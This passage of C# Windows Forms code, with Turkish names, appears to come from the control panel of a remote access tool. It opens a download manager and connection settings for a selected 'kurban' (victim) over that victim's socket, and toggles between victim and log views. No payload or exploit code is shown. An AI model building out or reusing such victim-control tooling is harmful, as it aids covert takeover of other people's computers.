                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    DownloadManager dwn = new DownloadManager(kurban.soket, kurban.id);
                    dwn.Show();
                }
            }
        }
        private void bağlantıAyarlarıToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (Kurbanlar kurban in kurban_listesi)
            {
                if (kurban.id == listView1.SelectedItems[0].Text)
                {
                    new Baglanti(kurban.soket, kurban.id).Show();
                }
            }
        }

        private void loglarToolStripMenuItem_Click(object sender, EventArgs e)
        {
            panel1.Visible = !panel1.Visible;
            if (panel1.Visible) { loglarToolStripMenuItem.Text = "Kurbanlar"; }
            else { loglarToolStripMenuItem.Text = "Loglar"; }
        }
    }
}